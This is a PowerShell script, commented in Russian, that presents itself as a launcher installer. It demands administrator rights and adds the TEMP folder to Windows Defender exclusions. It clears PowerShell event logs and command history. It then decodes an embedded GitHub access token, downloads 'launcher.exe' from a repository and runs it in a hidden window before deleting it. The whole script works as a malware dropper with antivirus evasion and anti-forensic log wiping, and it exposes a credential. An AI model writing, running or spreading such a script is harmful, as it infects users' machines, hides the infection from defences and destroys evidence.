
# Проверка на запуск от имени администратора
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Запустите PowerShell от имени администратора." -ForegroundColor Red
        exit
    }
}

# Функция очистки истории PowerShell
function ClrHistory {
    try {
        Write-Host "УДАЛЕНИЕ ЛОГОВ..." -ForegroundColor Green
        Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
        Remove-Item ($env:AppData + '\Microsoft\Windows\PowerShell') -Recurse -Force -ErrorAction Stop
        Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction Stop
    } catch {
        Write-Host "Ошибка очистки истории." -ForegroundColor Red
    }
}

# Функция добавления папки TEMP в исключения антивируса
function AddToDefenderExclusions {
    try {
        $tempPath = $env:TEMP
        Add-MpPreference -ExclusionPath $tempPath -ErrorAction Stop
        Write-Host "Папка TEMP успешно добавлена в исключения." -ForegroundColor Green
    } catch {
        Write-Host "Ошибка при добавлении папки TEMP в исключения. Убедитесь, что PowerShell запущен от имени администратора." -ForegroundColor Red
    }
}

# Основной скрипт
Test-Admin

AddToDefenderExclusions

Start-Sleep -s 1

try {
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    Clear-EventLog -LogName "Windows PowerShell" -ErrorAction Stop
} catch {
    Write-Host "Ошибка очистки логов. Возможно вы открыли PowerShell не от имени администратора." -ForegroundColor Red
    exit
}

$temp = $env:TEMP

try {
    Write-Host "ЗАПУСК..." -ForegroundColor Green
    $contFile = [System.IO.Path]::GetTempFileName()

    try {
		# Указываем закодированную строку вручную
		$EncodedString = "QmVhcmVyIGdpdGh1Yl9wYXRfMTFCSkVOSDRJMFRjOE1EWmNUYW85Vl9iQmNLSHhVejhCdEszdFI1cGVuaDlXT3cwQVVKaktNNEtIUVBNREZwQ3pWTkJPTkVUNFQ4YzBpSGpXcg=="

		# Декодируем строку из переменной
		$DecodedString = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedString))

		$q = '"'
        # Убедитесь, что заголовки заданы корректно
        $headers = @{"Authorization" = "$DecodedString"}

        # Выполнение запроса
        $response = Invoke-RestMethod 'https://api.github.com/repos/xsdementevx/launcher/contents/launcher.exe' -Method 'GET' -Headers $headers

        if ($response.content) {
            try {
                $cleanedContent = $response.content -replace "`n", "" -replace "`r", ""
                $decodedContent = [System.Convert]::FromBase64String($cleanedContent)
                [System.IO.File]::WriteAllBytes($contFile, $decodedContent)

                Write-Host "Файл успешно сохранен: $contFile" -ForegroundColor Green
            } catch {
                Write-Host "Ошибка декодирования или записи файла: $($_.Exception.Message)" -ForegroundColor Red
                exit
            }
        } else {
            Write-Host "Ошибка: файл не найден или отсутствует доступ." -ForegroundColor Red
            
        }
    } catch {
        Write-Host "Ошибка во время установки необходимых компонентов. Проверьте токен или запустите от имени администратора." -ForegroundColor Red
        
    }

    try {
        # Запуск скачанного файла и удаление после выполнения
        $q = '"'
        $arg = "$q$contFile$q"
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b /wait cmd /c $arg && del $arg" -WindowStyle Hidden
    } catch {
        Write-Host "Ошибка во время выполнения скачанного файла. Попробуйте запустить от имени администратора." -ForegroundColor Red
    }
} finally {
    ClrHistory
}

exit
